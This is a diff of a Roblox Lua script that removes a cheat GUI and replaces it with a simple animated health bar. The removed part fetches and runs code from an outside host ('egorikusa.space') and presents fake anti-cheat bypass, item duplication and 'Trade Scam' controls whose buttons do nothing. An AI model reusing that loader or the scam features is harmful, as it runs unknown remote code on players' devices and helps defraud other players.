@@ -1,131 +1,67 @@
-getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/d01cb5ebe423840d74f01a2b.lua", true))()
+local TweenService = game:GetService("TweenService")
 
-game:GetService("StarterGui"):SetCore("SendNotification", { 
-        Title = "Activate Bypass!";
-        Text = "N3on932 on TOP";
-        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
-    Duration = 101;
+local BasicHealthGUI = Instance.new("ScreenGui")
+local Healthbar = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Healthbar_2 = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local percentage = Instance.new("TextLabel")
+local UIStroke = Instance.new("UIStroke")
+local Sound = Instance.new("Sound")
 
-game:GetService("StarterGui"):SetCore("SendNotification", { 
-        Title = "Success!";
-        Text = "Enjoy!";
-        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
-    Duration = 101;
+-- Parent GUI
+BasicHealthGUI.Name = "Basic Health GUI"
+BasicHealthGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/slf0Dev/Ocerium_Project/main/Library.lua"))()
-Window = Library.Main("N3on932 GUI","LeftAlt") -- change "LeftAlt" to key that you want will hide gui
+-- Barre principale
+Healthbar.Name = "Healthbar"
+Healthbar.Parent = BasicHealthGUI
+Healthbar.AnchorPoint = Vector2.new(0.5, 0.5)
+Healthbar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Healthbar.BackgroundTransparency = 0.25
+Healthbar.Position = UDim2.new(0.5, 0, -0.2, 0)
+Healthbar.Size = UDim2.new(0.25, 0, 0.05, 0)
+UICorner.Parent = Healthbar
 
+-- Barre remplissage
+Healthbar_2.Name = "Fill"
+Healthbar_2.Parent = Healthbar
+Healthbar_2.BackgroundColor3 = Color3.fromRGB(0, 200, 50)
+Healthbar_2.Size = UDim2.new(1, 0, 1, 0)
+UICorner_2.Parent = Healthbar_2
 
---//tab
-local Tab = Window.NewTab("⚠️ PLEASE READ ⚠️")
+-- Texte
+percentage.Parent = Healthbar
+percentage.AnchorPoint = Vector2.new(0.5, 0.5)
+percentage.BackgroundTransparency = 1
+percentage.Position = UDim2.new(0.5, 0, 0.5, 0)
+percentage.Size = UDim2.new(1, 0, 1, 0)
+percentage.Font = Enum.Font.SourceSansBold
+percentage.Text = "ACCEPTED"
+percentage.TextColor3 = Color3.new(1.000000, 1.000000, 1.000000)
+percentage.TextScaled = true
 
+-- Contour noir
+UIStroke.Parent = percentage
+UIStroke.Thickness = 3
+UIStroke.Color = Color3.fromRGB(0, 0, 0)
+UIStroke.Transparency = 0
 
---//section
-local Section = Tab.NewSection("• IF DON'T WORK, EXECUTE AGAIN!!!")
-
-
---//section
-local Section = Tab.NewSection("• BYPASS PRO")
-
-
---//section
-local Section = Tab.NewSection("• GO TO BYPASS SECTION AND CLICK BYPASS ANTICHEAT")
-
-
---//section
-local Section = Tab.NewSection("• WAIT 5 MINUTES FOR IT TO BYPASS")
-
-
---//section
-local Section = Tab.NewSection("• IF YOU CLICK ANYTHING ELSE DURING BYPASS YOU WILL FREEZE")
-
-
---//tab
-local Tab = Window.NewTab("Bypass 🟢")
-
-
---//section
-local Section = Tab.NewSection("• WAIT 5 MINUTES FOR IT TO BYPASS")
-
-
---//Toggles
-local DisabledToggle = Section.NewToggle("Bypass MM2 Anti-Cheat",function(bool)
-end,false) -- "true" is the default value of toggle
-
-
---//tab
-local Tab = Window.NewTab("Dupe 🟢")
-
-
---//section
-local Section = Tab.NewSection("🟢 = Working 🟡 = Partially Working 🔴 = Patched")
-
-
---//section
-local Section = Tab.NewSection("(once you click duping should begin it’s finished once you reset)")
-
-
---//section
-local Section = Tab.NewSection("[COULD BE A FEW MINUTES]")
-
-
---//Toggles
-local DisabledToggle = Section.NewToggle("Enable dupe.lua",function(bool)
-end,false) -- "true" is the default value of
-
-
---// Button
-local Button = Section.NewButton("Dupe Guns and Knives",function()
+-- Effet pulsant
+task.spawn(function()
+	while true do
+		TweenService:Create(UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 0, true),
+			{Thickness = 5, Transparency = 0.3}):Play()
+		task.wait(0.6)
+	end
 end)
 
+-- Son
+Sound.Parent = BasicHealthGUI
+Sound.SoundId = "rbxassetid://6979299092"
+Sound.Volume = 1
+Sound:Play()
 
---// Button
-local Button = Section.NewButton("Dupe Pets (BETA)",function()
-end)
-
-
---// Button
-local Button = Section.NewButton("Dupe Coins and Gems (BETA)",function()
-end)
-
-
---//tab
-local Tab = Window.NewTab("Trade Scam 🟢")
-
-
---//section
-local Section = Tab.NewSection("Step 1: Put in items, Step 2: Enable freeze.lua, Step 3: Freeze Trade.")
-
-
---//Toggles
-local DisabledToggle = Section.NewToggle("Enable freeze/trade/genui.lua",function(bool)
-end,false) -- "true" is the default value of
-
-
---// Button
-local Button = Section.NewButton("Freeze Trade",function()
-end)
-
-
---//section
-local Section = Tab.NewSection("TradeScamV2")
-
-
---//Toggles
-local DisabledToggle = Section.NewToggle("Enable tradescamv2.lua",function(bool)
-end,false) -- "true" is the default value of
-
-
---// Button
-local Button = Section.NewButton("Display Fake Items",function()
-end)
-
-
---// Button
-local Button = Section.NewButton("Auto Accept",function()
-end)
-
-
---//tab
-local Tab = Window.NewTab("Script Made By N3on932")
+-- Animation d'arrivée
+local tween = TweenService:Create(Healthbar, TweenInfo.new(0.8, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0.5, 0)})
+tween:Play()
